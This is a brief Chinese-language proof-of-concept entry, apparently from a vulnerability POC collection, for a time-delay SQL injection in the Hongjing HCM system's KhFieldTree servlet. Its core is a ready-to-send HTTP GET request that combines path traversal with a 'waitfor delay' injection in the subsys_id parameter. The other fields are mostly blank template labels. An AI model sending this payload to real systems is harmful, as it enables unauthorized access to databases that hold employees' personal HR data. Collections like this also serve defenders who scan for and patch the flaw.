﻿# 宏景 HCM_KhFieldTree SQL注入

> 更新时间：2023-12-04

> 漏洞编号：

> 漏洞说明：延迟注入

> 漏洞特征：

> 验证脚本：HTTP

```
GET /templates/attestation/%2e%2e/%2e%2e/servlet/performance/KhFieldTree?pointsetid=-1&subsys_id=11'waitfor+delay+'0:0:7'+-- HTTP/1.1
```

> 响应代码特征：-1

> 响应内容特征：

> 上传文件定位：

> 验证文件来源：宏景 HCM_KhFieldTree SQL注入.poc
